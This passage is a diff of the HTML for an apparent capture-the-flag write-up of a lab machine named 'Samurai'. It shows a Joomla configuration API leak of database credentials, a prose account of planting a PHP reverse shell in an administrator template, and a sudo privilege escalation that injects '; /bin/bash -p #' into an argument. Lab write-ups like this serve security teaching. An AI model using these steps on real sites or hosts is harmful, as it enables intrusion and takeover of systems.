class="s2">&#34;0&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;list_limit&#34;</span>:20,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;access&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang_const&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbtype&#34;</span>:<span class="s2">&#34;mysqli&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;localhost&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;joomla425&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;password&#34;</span>:<span class="s2">&#34;Pa847word987@Joomla456&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;db&#34;</span>:<span class="s2">&#34;Dbjoomla&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbprefix&#34;</span>:<span class="s2">&#34;iemj4_&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbencryption&#34;</span>:0,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbsslverifyservercert&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:4<span class="o">}}</span></span></span></code></pre></div></div>
+</span></span><span class="line hl"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span class="s2">&#34;next&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span class="s2">&#34;last&#34;</span>:<span class="s2">&#34;http:\/\/samurai.hsm\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_message&#34;</span>:<span class="s2">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;display_offline_message&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_image&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;sitename&#34;</span>:<span class="s2">&#34;Samurai&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;editor&#34;</span>:<span class="s2">&#34;tinymce&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;captcha&#34;</span>:<span class="s2">&#34;0&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;list_limit&#34;</span>:20,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;access&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang_const&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbtype&#34;</span>:<span class="s2">&#34;mysqli&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;localhost&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;joomla425&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;password&#34;</span>:<span class="s2">&#34;Pa847word987@Joomla456&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;db&#34;</span>:<span class="s2">&#34;Dbjoomla&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbprefix&#34;</span>:<span class="s2">&#34;iemj4_&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbencryption&#34;</span>:0,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbsslverifyservercert&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:4<span class="o">}}</span></span></span></code></pre></div></div>
 
 <h2 class="relative group">Login as Miyamoto user
     <div id="login-as-miyamoto-user" class="anchor"></div>
@@ -1601,7 +1988,7 @@ foothold, and escalate privileges to root.</p>
 <p>Once we’re inside the dashboard we take advantage of the currently running template by going into System-&gt;Templates-&gt;Administrator Templates. Once there, we can inject our php shell code into the index.php file (the main page) and save our changes. Then we have our listener running and refresh the main page on the web server and get a reverse shell back as <code>www-data.</code></p>
 <p>After looking around for a bit, we find our user flag which is in an unconventional place (not in the home folder). Then we proceed to escalate our privileges by running <code>sudo -l</code> this will help us see if we can run anything as sudo without a password.</p>
 
-<h1 class="relative group">Shell as root user
+<h2 class="relative group">Shell as root user
     <div id="shell-as-root-user" class="anchor"></div>
     
     <span
@@ -1609,9 +1996,9 @@ foothold, and escalate privileges to root.</p>
         <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#shell-as-root-user" aria-label="Anchor">#</a>
     </span>
     
-</h1>
+</h2>
 <p>Once you find the file we can run as root without a password we can run the following command to get into the root shell</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@streetcoder:/opt/backup$ sudo ./DbMaria <span class="s1">&#39;test; /bin/bash -p #&#39;</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line hl"><span class="cl">www-data@streetcoder:/opt/backup$ sudo ./DbMaria <span class="s1">&#39;test; /bin/bash -p #&#39;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">/*M!999999<span class="se">\-</span> <span class="nb">enable</span> the sandbox mode */ 
 </span></span><span class="line"><span class="cl">-- MariaDB dump 10.19  Distrib 10.6.23-MariaDB, <span class="k">for</span> debian-linux-gnu <span class="o">(</span>x86_64<span class="o">)</span>
